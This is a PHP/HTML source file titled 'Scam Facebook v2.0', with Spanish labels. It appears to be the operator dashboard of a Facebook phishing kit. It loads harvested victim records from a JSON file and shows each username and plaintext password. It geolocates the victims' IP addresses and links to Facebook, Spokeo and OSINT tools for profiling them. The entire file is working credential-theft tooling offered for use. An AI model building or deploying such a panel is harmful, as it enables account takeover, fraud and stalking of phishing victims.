<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Scam Facebook v2.0</title>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
	<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
	<script async defer src="https://maps.googleapis.com/maps/api/js?key=YOUR_API_KEY&callback=initMap"></script>
<style>

     .detalles{
     	list-style: none;
     	margin: 0;
     	padding: 0;
     }
     .detalles li{
     	width: 48%;
     	float: left;
     	line-height: 30px;
     }
</style>
</head>
<body>
<?php
include_once('ipinfo.php');

$ipinfo = new ipinfo("8.8.8.8");

/* Fetch hostname */
print_r($ipinfo->fetch()->hostname);

/* Fetch city */
print_r($ipinfo->fetch()->city);

/* Fetch region */
print_r($ipinfo->fetch()->region);

/* Fetch country */
print_r($ipinfo->fetch()->country);

/* Fetch location */
print_r($ipinfo->fetch()->loc);

/* Fetch organization */
print_r($ipinfo->fetch()->org);

/* Fetch postal */
print_r($ipinfo->fetch()->postal);

?>
<div class="row">
	<div class="col-md-4"></div>
	<div class="col-md-4">
		<h3>Scam Facebook v2.0</h3>

	<?php

// Api Pipl
// $url_json = file_get_contents("https://api.pipl.com/search/?email=multimedia.publicidad%40gmail.com&key=CONTACT-DEMO-c2kbw43b51a4wpfi1dyq1tg3");

// $url_json = file_get_contents("descarga.json");
// $json = json_decode($url_json);
// var_dump($json);
// echo $json->names[1]->display; //donut


	include_once('ipinfo.php');

	$string = file_get_contents("../data.json");
	$json = json_decode($string, true);

	foreach ($json as $person_name => $person_a) {

	$ipinfo = new ipinfo($person_a['miip']);


	?>
	<div class="panel-group">
		<div class="panel panel-default">
			<div class="panel-heading">
			<?php echo  $person_a['user']; ?>

			<a data-toggle="collapse" href="#<?php echo $person_a['pass'];?>" class="btn btn-primary btn-xs pull-right">ver detalles</a>
		</div>
		<div id="<?php echo $person_a['pass'];?>" class="panel-collapse collapse">
			<div class="panel-body">
				<div class="row">
					<div class="col-md-12">
						    <label for="exampleInputEmail1">Fecha</label>
						    <input type="text" class="form-control" value="<?php echo $person_a['date']; ?>">

						<ul class="detalles">
							<li><strong>Fecha</strong> <?php echo $person_a['date']; ?></li>
							<li><strong>IP</strong> <?php echo $person_a['miip']; ?></li>
							<li><strong>Usuario</strong> <?php echo $person_a['user']; ?></li>
							<li><strong>Contraseña</strong> <?php echo $person_a['pass']; ?></li>
						</ul>
							<h4>Otros Datos</h4>
						<ul class="detalles">
							<li style="width:100%"><strong>Hostname:</strong> <?php echo $ipinfo->fetch()->hostname; ?></li>
							<li><strong>Ciudad</strong> <?php echo $ipinfo->fetch()->city; ?></li>
							<li><strong>Region</strong> <?php echo $ipinfo->fetch()->region; ?></li>
							<li><strong>Pais</strong> <?php echo $ipinfo->fetch()->country; ?></li>
							<li><strong>CP</strong> <?php echo $ipinfo->fetch()->postal; ?></li>
							<li><strong>Org</strong> <?php echo $ipinfo->fetch()->org; ?></li>
							<li><strong>Location</strong> <?php echo $ipinfo->fetch()->loc; ?></li>
						</ul>
						<br>
						<hr />
						<br>
						<a target="new" href="https://www.facebook.com/search/top/?init=quick&q=<?php echo $person_a['user']; ?>" class="btn btn-default"><i class="fa fa-facebook"></i> Buscar en Facebook</a>
						<a target="new" href="https://plus.google.com/s/<?php echo $person_a['user']; ?>" class="btn btn-default"><i class="fa fa-google-plus-official"></i> Buscar en Google +</a>
						<a target="new" href="http://www.spokeo.com/social/profile?q=<?php echo $person_a['user']; ?>" class="btn btn-default"><i class="fa fa-users"></i> Buscar en Spokeo</a>
					</div>
				</div>
			<?php
				$getlatlon = $ipinfo->fetch()->loc;
				$latlng = explode(",", $getlatlon);
				$latitud = $latlng[0];
				$longitud = $latlng[1];
			?>

			</div>
		</div>
</div>

<?php
	}
	?>
		<hr>
		<h3>External Tools</h3>
		<ul>
			<li><a href="https://inteltechniques.com/">Inteltechniques</a></li>
			<li><a href="http://le-tools.com/ExtractFace.html">Extract Face</a></li>
			<li><a href="http://findfacebookid.com/">Find Facebook ID</a></li>
			<li><a href="https://github.com/lockfale/ARF">Advanced Reconnaissance Framework</a></li>
		</ul>

	</div>
</div>




</body>
</html>

